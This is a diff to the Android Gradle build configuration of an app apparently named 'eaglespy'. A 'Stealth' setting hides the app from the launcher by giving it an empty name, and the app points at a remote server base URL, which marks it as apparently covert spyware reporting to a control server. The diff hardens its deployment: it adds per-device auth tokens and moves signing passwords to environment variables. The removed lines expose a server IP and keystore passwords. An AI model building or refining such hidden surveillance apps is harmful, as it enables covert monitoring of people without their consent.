@@ -15,8 +15,13 @@ android {
         versionName "1.0"
 
         // Dynamic Server URL from Gradle Property (-PserverBaseUrl="http://ip:port")
-        def serverBaseUrl = project.hasProperty('serverBaseUrl') ? project.serverBaseUrl : "http://213.91.211.150:3000"
+        def serverBaseUrl = project.hasProperty('serverBaseUrl') ? project.serverBaseUrl : "http://10.0.2.2:3000"
         buildConfigField "String", "SERVER_BASE_URL", "\"${serverBaseUrl}\""
+        
+        // Device Authentication Token from Gradle Property (-PdeviceToken="...")
+        // Generate unique token per deployment: openssl rand -base64 32
+        def deviceToken = project.hasProperty('deviceToken') ? project.deviceToken : System.getenv('DEVICE_AUTH_TOKEN') ?: 'CHANGE_ME_BEFORE_DEPLOYMENT'
+        buildConfigField "String", "DEVICE_AUTH_TOKEN", "\"${deviceToken}\""
 
         // Stealth: Empty app name (invisible in launcher)
         resValue "string", "app_name", ""
@@ -25,9 +30,10 @@ android {
     signingConfigs {
         release {
             storeFile file('../release.keystore')
-            storePassword 'eaglespy2024'
-            keyAlias 'eaglespy'
-            keyPassword 'eaglespy2024'
+            // Passwords from environment variables (never hardcode!)
+            storePassword System.getenv('KEYSTORE_PASSWORD') ?: 'CHANGE_ME'
+            keyAlias System.getenv('KEY_ALIAS') ?: 'eaglespy'
+            keyPassword System.getenv('KEY_PASSWORD') ?: 'CHANGE_ME'
         }
     }
 
